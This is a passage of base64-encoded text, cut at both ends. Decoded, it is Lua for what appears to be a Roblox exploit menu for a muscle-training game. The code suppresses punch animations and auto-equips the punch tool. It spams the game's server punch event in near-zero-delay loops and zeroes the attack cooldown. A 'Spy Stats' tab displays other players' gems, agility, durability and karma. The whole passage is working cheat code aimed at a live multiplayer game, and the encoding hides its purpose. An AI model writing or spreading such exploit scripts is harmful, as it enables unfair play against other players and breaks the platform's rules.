1hbm9pZCIpIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKCiAgICAgICAgZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KICAgICAgICAgICAgaWYgdHJhY2suQW5pbWF0aW9uIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGFuaW1JZCA9IHRyYWNrLkFuaW1hdGlvbi5BbmltYXRpb25JZAogICAgICAgICAgICAgICAgbG9jYWwgYW5pbU5hbWUgPSB0cmFjay5OYW1lOmxvd2VyKCkKCiAgICAgICAgICAgICAgICBpZiBibG9ja2VkQW5pbWF0aW9uc1thbmltSWRdIG9yCiAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goInB1bmNoIikgb3IKICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgiYXR0YWNrIikgb3IKICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgicmlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdHJhY2s6U3RvcCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGlmIG5vdCBfRy5BbmltQmxvY2tDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgbG9jYWwgY29ubmVjdGlvbiA9IGh1bWFub2lkLkFuaW1hdGlvblBsYXllZDpDb25uZWN0KGZ1bmN0aW9uKHRyYWNrKQogICAgICAgICAgICAgICAgaWYgdHJhY2suQW5pbWF0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBhbmltSWQgPSB0cmFjay5BbmltYXRpb24uQW5pbWF0aW9uSWQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhbmltTmFtZSA9IHRyYWNrLk5hbWU6bG93ZXIoKQoKICAgICAgICAgICAgICAgICAgICBpZiBibG9ja2VkQW5pbWF0aW9uc1thbmltSWRdIG9yCiAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJwdW5jaCIpIG9yCiAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJhdHRhY2siKSBvcgogICAgICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgicmlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRyYWNrOlN0b3AoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIF9HLkFuaW1CbG9ja0Nvbm5lY3Rpb24gPSBjb25uZWN0aW9uCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBzZXR1cEFuaW1hdGlvbkJsb2NraW5nKCkKCiAgICBsb2NhbCBmdW5jdGlvbiBvdmVycmlkZVRvb2xBY3RpdmF0aW9uKCkKICAgICAgICBsb2NhbCBmdW5jdGlvbiBwcm9jZXNzVG9vbCh0b29sKQogICAgICAgICAgICBpZiB0b29sIGFuZCAodG9vbC5OYW1lID09ICJQdW5jaCIgb3IgdG9vbC5OYW1lOm1hdGNoKCJBdHRhY2siKSBvciB0b29sLk5hbWU6bWF0Y2goIlJpZ2h0IikpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCB0b29sOkdldEF0dHJpYnV0ZSgiQWN0aXZhdGVkT3ZlcnJpZGUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdG9vbDpTZXRBdHRyaWJ1dGUoIkFjdGl2YXRlZE92ZXJyaWRlIiwgdHJ1ZSkKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29ubmVjdGlvbiA9IHRvb2wuQWN0aXZhdGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRyYWNrIGluIHBhaXJzKGNoYXIuSHVtYW5vaWQ6R2V0UGxheWluZ0FuaW1hdGlvblRyYWNrcygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRyYWNrLkFuaW1hdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFuaW1JZCA9IHRyYWNrLkFuaW1hdGlvbi5BbmltYXRpb25JZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhbmltTmFtZSA9IHRyYWNrLk5hbWU6bG93ZXIoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYmxvY2tlZEFuaW1hdGlvbnNbYW5pbUlkXSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goInB1bmNoIikgb3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJhdHRhY2siKSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW5pbU5hbWU6bWF0Y2goInJpZ2h0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJhY2s6U3RvcCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLlRvb2xDb25uZWN0aW9ucyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIF9HLlRvb2xDb25uZWN0aW9ucyA9IHt9CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgX0cuVG9vbENvbm5lY3Rpb25zW3Rvb2xdID0gY29ubmVjdGlvbgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgcHJvY2Vzc1Rvb2wodG9vbCkKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgY2hhciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBjaGFyIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gcGFpcnMoY2hhcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc1Rvb2wodG9vbCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgbm90IF9HLkJhY2twYWNrQWRkZWRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgX0cuQmFja3BhY2tBZGRlZENvbm5lY3Rpb24gPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2suQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQogICAgICAgICAgICAgICAgaWYgY2hpbGQ6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc1Rvb2woY2hpbGQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAoKICAgICAgICBpZiBub3QgX0cuQ2hhcmFjdGVyVG9vbEFkZGVkQ29ubmVjdGlvbiBhbmQgY2hhciB0aGVuCiAgICAgICAgICAgIF9HLkNoYXJhY3RlclRvb2xBZGRlZENvbm5lY3Rpb24gPSBjaGFyLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgIHByb2Nlc3NUb29sKGNoaWxkKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIG92ZXJyaWRlVG9vbEFjdGl2YXRpb24oKQoKICAgIGlmIG5vdCBfRy5BbmltTW9uaXRvckNvbm5lY3Rpb24gdGhlbgogICAgICAgIF9HLkFuaW1Nb25pdG9yQ29ubmVjdGlvbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgdGljaygpICUgMC41IDwgMC4wMSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgaWYgY2hhciBhbmQgY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRyYWNrIGluIHBhaXJzKGNoYXIuSHVtYW5vaWQ6R2V0UGxheWluZ0FuaW1hdGlvblRyYWNrcygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0cmFjay5BbmltYXRpb24gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYW5pbUlkID0gdHJhY2suQW5pbWF0aW9uLkFuaW1hdGlvbklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhbmltTmFtZSA9IHRyYWNrLk5hbWU6bG93ZXIoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJsb2NrZWRBbmltYXRpb25zW2FuaW1JZF0gb3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbmltTmFtZTptYXRjaCgicHVuY2giKSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJhdHRhY2siKSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFuaW1OYW1lOm1hdGNoKCJyaWdodCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cmFjazpTdG9wKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBpZiBub3QgX0cuQ2hhcmFjdGVyQWRkZWRDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5DaGFyYWN0ZXJBZGRlZENvbm5lY3Rpb24gPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihuZXdDaGFyKQogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgc2V0dXBBbmltYXRpb25CbG9ja2luZygpCiAgICAgICAgICAgIG92ZXJyaWRlVG9vbEFjdGl2YXRpb24oKQoKICAgICAgICAgICAgaWYgX0cuQ2hhcmFjdGVyVG9vbEFkZGVkQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICBfRy5DaGFyYWN0ZXJUb29sQWRkZWRDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIF9HLkNoYXJhY3RlclRvb2xBZGRlZENvbm5lY3Rpb24gPSBuZXdDaGFyLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgIHByb2Nlc3NUb29sKGNoaWxkKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKZnVuY3Rpb24gUmVjb3ZlcnlQdW5jaCgpCiAgICBpZiBfRy5BbmltQmxvY2tDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5BbmltQmxvY2tDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgIF9HLkFuaW1CbG9ja0Nvbm5lY3Rpb24gPSBuaWwKICAgIGVuZAogICAgaWYgX0cuQW5pbU1vbml0b3JDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5BbmltTW9uaXRvckNvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgX0cuQW5pbU1vbml0b3JDb25uZWN0aW9uID0gbmlsCiAgICBlbmQKICAgIGlmIF9HLlRvb2xDb25uZWN0aW9ucyB0aGVuCiAgICAgICAgZm9yIF8sIGNvbm4gaW4gcGFpcnMoX0cuVG9vbENvbm5lY3Rpb25zKSBkbwogICAgICAgICAgICBpZiBjb25uIHRoZW4gY29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgZW5kCiAgICAgICAgX0cuVG9vbENvbm5lY3Rpb25zID0gbmlsCiAgICBlbmQKICAgIGlmIF9HLkJhY2twYWNrQWRkZWRDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5CYWNrcGFja0FkZGVkQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICBfRy5CYWNrcGFja0FkZGVkQ29ubmVjdGlvbiA9IG5pbAogICAgZW5kCiAgICBpZiBfRy5DaGFyYWN0ZXJUb29sQWRkZWRDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5DaGFyYWN0ZXJUb29sQWRkZWRDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgIF9HLkNoYXJhY3RlclRvb2xBZGRlZENvbm5lY3Rpb24gPSBuaWwKICAgIGVuZAogICAgaWYgX0cuQ2hhcmFjdGVyQWRkZWRDb25uZWN0aW9uIHRoZW4KICAgICAgICBfRy5DaGFyYWN0ZXJBZGRlZENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgX0cuQ2hhcmFjdGVyQWRkZWRDb25uZWN0aW9uID0gbmlsCiAgICBlbmQKZW5kCgpLaWxsZXI6QWRkQnV0dG9uKCJSZWNvdmVyIFB1bmNoIEFuaW0iLCBmdW5jdGlvbigpCiAgICBSZWNvdmVyeVB1bmNoKCkKZW5kKQoKS2lsbGVyOkFkZFN3aXRjaCgiQXV0byBFcXVpcCBQdW5jaCIsIGZ1bmN0aW9uKHN0YXRlKQoJYXV0b0VxdWlwUHVuY2ggPSBzdGF0ZQoJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJd2hpbGUgYXV0b0VxdWlwUHVuY2ggZG8KCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQlpZiBwdW5jaCB0aGVuCgkJCQlwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCQkJZW5kCgkJCXRhc2sud2FpdCgwLjEpCgkJZW5kCgllbmQpCmVuZCkKCktpbGxlcjpBZGRTd2l0Y2goIkF1dG8gUHVuY2ggW05vIEFuaW1hdGlvbl0iLCBmdW5jdGlvbihzdGF0ZSkKCWF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQl3aGlsZSBhdXRvUHVuY2hOb0FuaW0gZG8KCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQlpZiBwdW5jaCB0aGVuCgkJCQlpZiBwdW5jaC5QYXJlbnQgfj0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KCQkJCQlwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCQkJCWVuZAoJCQkJTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKCQkJCUxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKCQkJZWxzZQoJCQkJYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKCQkJZW5kCgkJCXRhc2sud2FpdCgwLjAxKQoJCWVuZAoJZW5kKQplbmQpCgpLaWxsZXI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIiwgZnVuY3Rpb24oc3RhdGUpCglfRy5mYXN0SGl0QWN0aXZlID0gc3RhdGUKCWlmIHN0YXRlIHRoZW4KCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJd2hpbGUgX0cuZmFzdEhpdEFjdGl2ZSBkbwoJCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQkJaWYgcHVuY2ggdGhlbgoJCQkJCXB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoJCQkJCWlmIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgoJCQkJCQlwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAoJCQkJCWVuZAoJCQkJZW5kCgkJCQl0YXNrLndhaXQoMC4xKQoJCQllbmQKCQllbmQpCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIF9HLmZhc3RIaXRBY3RpdmUgZG8KCQkJCWxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKCQkJCWlmIHB1bmNoIHRoZW4KCQkJCQlwdW5jaDpBY3RpdmF0ZSgpCgkJCQllbmQKCQkJCXRhc2sud2FpdCgwLjEpCgkJCWVuZAoJCWVuZCkKCWVsc2UKCQlsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCgkJaWYgcHVuY2ggdGhlbgoJCQlwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawoJCWVuZAoJZW5kCmVuZCkKCktpbGxlcjpBZGRTd2l0Y2goIkZhc3QgUHVuY2giLCBmdW5jdGlvbihzdGF0ZSkKCV9HLmF1dG9QdW5jaEFjdGl2ZSA9IHN0YXRlCglpZiBzdGF0ZSB0aGVuCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIF9HLmF1dG9QdW5jaEFjdGl2ZSBkbwoJCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQkJaWYgcHVuY2ggdGhlbgoJCQkJCXB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoJCQkJCWlmIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgoJCQkJCQlwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAoJCQkJCWVuZAoJCQkJZW5kCgkJCQl0YXNrLndhaXQoKQoJCQllbmQKCQllbmQpCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIF9HLmF1dG9QdW5jaEFjdGl2ZSBkbwoJCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQkJaWYgcHVuY2ggdGhlbgoJCQkJCXB1bmNoOkFjdGl2YXRlKCkKCQkJCWVuZAoJCQkJdGFzay53YWl0KCkKCQkJZW5kCgkJZW5kKQoJZWxzZQoJCWxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKCQlpZiBwdW5jaCB0aGVuCgkJCXB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCgkJZW5kCgllbmQKZW5kKQoKbG9jYWwgTG9va0R1cmEgPSB3aW5kb3c6QWRkVGFiKCJTcHkgU3RhdHMiKQoKbG9jYWwgU2VsZWN0UGxheWVyTmFtZSA9ICIiCgpsb2NhbCBQbGF5ZXJEcm9wID0gTG9va0R1cmE6QWRkRHJvcGRvd24oIlNlbGVjdCBQbGF5ZXIiLCBmdW5jdGlvbihWYWx1ZSkKICAgIFNlbGVjdFBsYXllck5hbWUgPSBWYWx1ZTptYXRjaCgifCAoLispIikKICAgIHByZXZpb3VzVmFsdWVzID0ge30KZW5kKQoKbG9jYWwgUGxheWVyc2xpc3QgPSB7fQpmb3IgXywgUGxyIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkdldFBsYXllcnMoKSkgZG8KICAgIGxvY2FsIGRpc3BsYXlOYW1lID0gUGxyLkRpc3BsYXlOYW1lIC4uICIgfCAiIC4uIFBsci5OYW1lCiAgICB0YWJsZS5pbnNlcnQoUGxheWVyc2xpc3QsIGRpc3BsYXlOYW1lKQplbmQKZm9yIF8sIEFkZFBsciBpbiBpcGFpcnMoUGxheWVyc2xpc3QpIGRvCiAgICBQbGF5ZXJEcm9wOkFkZChBZGRQbHIpCmVuZAoKbG9jYWwgZnVuY3Rpb24gRm9ybWF0TnVtYmVyV2l0aENvbW1hcyhudW1iZXIpCiAgICBsb2NhbCBmb3JtYXR0ZWQgPSB0b3N0cmluZyhudW1iZXIpOnJldmVyc2UoKTpnc3ViKCIoJWQlZCVkKSIsICIlMSwiKTpyZXZlcnNlKCkKICAgIHJldHVybiBmb3JtYXR0ZWQ6Z3N1YigiXiwiLCAiIikKZW5kCgpsb2NhbCBmdW5jdGlvbiBGb3JtYXRBYmJyZXZpYXRlZChudW1iZXIpCiAgICBsb2NhbCBhYmJyZXZpYXRpb25zID0geyIiLCAiSyIsICJNIiwgIkIiLCAiVCIsICJRYSIsICJRaSJ9CiAgICBsb2NhbCBhYmJyZXZpYXRpb25JbmRleCA9IDEKICAgIHdoaWxlIG51bWJlciA+PSAxMDAwIGRvCiAgICAgICAgbnVtYmVyID0gbnVtYmVyIC8gMTAwMAogICAgICAgIGFiYnJldmlhdGlvbkluZGV4ID0gYWJicmV2aWF0aW9uSW5kZXggKyAxCiAgICBlbmQKICAgIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmIiwgbnVtYmVyKSAuLiBhYmJyZXZpYXRpb25zW2FiYnJldmlhdGlvbkluZGV4XQplbmQKCmxvY2FsIGZ1bmN0aW9uIEZvcm1hdERpc3BsYXkodmFsdWUpCiAgICBsb2NhbCBub3JtYWwgPSBGb3JtYXROdW1iZXJXaXRoQ29tbWFzKHZhbHVlKQogICAgbG9jYWwgYWJicmV2aWF0ZWQgPSBGb3JtYXRBYmJyZXZpYXRlZCh2YWx1ZSkKICAgIHJldHVybiAiWyAiIC4uIG5vcm1hbCAuLiAiIHwgIiAuLiBhYmJyZXZpYXRlZCAuLiAiIF0iCmVuZAoKbG9jYWwgcHJldmlvdXNWYWx1ZXMgPSB7fQoKbG9jYWwgVXBkYXRlID0gTG9va0R1cmE6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTEgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlMiA9IExvb2tEdXJhOkFkZExhYmVsKCIiKQpsb2NhbCBVcGRhdGUzID0gTG9va0R1cmE6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTQgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlNSA9IExvb2tEdXJhOkFkZExhYmVsKCIiKQpsb2NhbCBVcGRhdGU2ID0gTG9va0R1cmE6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTkgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlMTAgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlMTEgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlMTIgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlMTMgPSBMb29rRHVyYTpBZGRMYWJlbCgiIikKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdGFzay53YWl0KDApIGRvCiAgICAgICAgaWYgU2VsZWN0UGxheWVyTmFtZSB+PSAiIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVyczpGaW5kRmlyc3RDaGlsZChTZWxlY3RQbGF5ZXJOYW1lKQogICAgICAgICAgICBpZiBwbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJHZW1zIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTEuVGV4dCA9ICJHZW1zOiAiIC4uIEZvcm1hdERpc3BsYXkocGxheWVyLkdlbXMuVmFsdWUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQWdpbGl0eSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGUzLlRleHQgPSAiQWdpbGl0eTogIiAuLiBGb3JtYXREaXNwbGF5KHBsYXllci5BZ2lsaXR5LlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVXBkYXRlNC5UZXh0ID0gIkR1cmFiaWxpdHk6ICIgLi4gRm9ybWF0RGlzcGxheShwbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJtdXNjbGVLaW5nVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGU2LlRleHQgPSAiTXVzY2xlIEtpbmcgVGltZTogIiAuLiBGb3JtYXREaXNwbGF5KHBsYXllci5tdXNjbGVLaW5nVGltZS5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJjdXN0b21TaXplIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTEwLlRleHQgPSAiQ3VzdG9tIFNpemU6ICIgLi4gRm9ybWF0RGlzcGxheShwbGF5ZXIuY3VzdG9tU2l6ZS5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJjdXN0b21TcGVlZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGUxMS5UZXh0ID0gIkN1c3RvbSBTcGVlZDogIiAuLiBGb3JtYXREaXNwbGF5KHBsYXllci5jdXN0b21TcGVlZC5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJldmlsS2FybWEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVXBkYXRlMTIuVGV4dCA9ICJFdmlsIEthcm1hOiAiIC4uIEZvcm1hdERpc3BsYXkocGxheWVyLmV2aWxLYXJtYS5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJnb29kS2FybWEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVXBkYXRlMTMuVGV4dCA9ICJHb29kIEthcm1hOiAiIC4uIEZvcm1hdERpc3BsYXkocGxheWVyLmdvb2RLYXJtYS5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgI